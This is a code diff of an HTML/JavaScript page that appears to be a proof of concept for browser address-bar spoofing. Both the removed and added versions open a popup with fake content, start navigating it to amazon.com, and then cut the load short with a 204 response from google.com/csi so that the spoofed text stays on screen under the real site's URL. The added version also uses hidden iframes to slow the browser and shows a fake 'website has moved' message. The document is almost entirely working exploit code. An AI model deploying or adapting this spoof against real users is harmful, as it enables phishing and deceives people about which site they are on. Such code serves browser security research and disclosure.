@@ -1,42 +1,75 @@
-<button onclick=startAttack()>Spoof</button><br>
-After clicking button, the spoofed content will go blank in 4 seconds.<br>
-Switch to this tab and then back to the popup tab to make it appear again.<br>
+<body>
+<a id=test href="https://www.amazon.com/" onclick=foo()>https://www.amazon.com/</a>
+</body>
 
 <script>
+
 var w;
 var t;
+var z;
 
-function startAttack() {
-  // Open popup with fake content.
-  w = window.open();
-  w.document.write("Fake content");
-
-  // Wait for URL to change, then redirect.
-  t = setInterval('redirect()', 1);
+if(location.href.indexOf("fake") !== -1){
+document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
 }
 
-function redirect() {
-  if (w.location.href == 'about:blank')
-  	return;
 
-  alert("Switch back to opener tab before redirecting.");
+function foo(){
 
-  w.location.href = 'https://www.amazon.com/';
+document.getElementById("test").href="#";
 
-  clearInterval(t);
+w = window.open("?fake");
 
-  var i = setInterval(function () {
-    try {
-      // This will throw an exception after the popup commits amazon.com.
-      var x = w.location.href;
-    } catch (e) {
-      // Interrupt the load of amazon.com with a 204 response.
-      // If this is done quickly enough, nothing will paint.
-      w.location.href = 'https://www.google.com/csi';
+t = setInterval('bar()',1);
 
-      // We're done.  Could show an alert to force the user to switch tabs.
-      clearInterval(i);
-    }
-  }, 1);
 }
+
+function bar(){
+
+if(w.location.href !== 'about:blank'){
+
+alert("Redirecting");
+
+document.body.innerHTML = "<h1>Redirecting</h1>";
+
+slow();
+
+w.location.href = 'https://www.amazon.com/';
+
+clearInterval(t);
+
+z = setInterval('baz()',1);
+
+}
+
+}
+
+function baz(){
+try{
+w.location.href !== 'about:blank';
+}
+catch (e){
+
+//stop page loading
+w.location.href='https://www.google.com/csi';
+clearInterval(z);
+
+//Make sure the old content is not cleared
+setTimeout("alert('ok');window.location.href='about:blank';window.close();", 3000);
+}
+
+}
+
+
+//slow down the website
+function slow() {
+for (i=0; i<10; i++ ) {
+
+iframe = document.createElement("iframe");
+iframe.src = 'https://www.amazon.com/';
+iframe.style = 'display:none';
+document.body.appendChild(iframe);
+
+}
+}
+
 </script>
